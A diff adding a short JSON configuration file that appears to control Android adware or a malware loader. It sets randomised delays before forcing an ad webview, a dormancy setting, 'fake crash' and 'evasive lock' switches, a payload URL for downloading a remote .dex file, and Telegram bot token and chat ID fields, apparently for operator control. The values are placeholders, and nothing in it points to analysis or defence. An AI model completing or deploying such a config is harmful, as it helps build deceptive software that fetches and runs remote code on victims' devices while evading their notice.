@@ -1,0 +1,13 @@
+{
+  "isEnabled": true,
+  "webview_url": "https://your-ad-landing-page.com",
+  "min_delay_ms": 300000,
+  "max_delay_ms": 900000,
+  "close_delay_ms": 3000,
+  "dormancy_days": 0,
+  "fake_crash_enabled": false,
+  "evasive_lock_enabled": true,
+  "payload_url": "https://your-server.com/payload.dex",
+  "tg_token": "your_bot_token",
+  "tg_chat_id": "your_chat_id"
+}
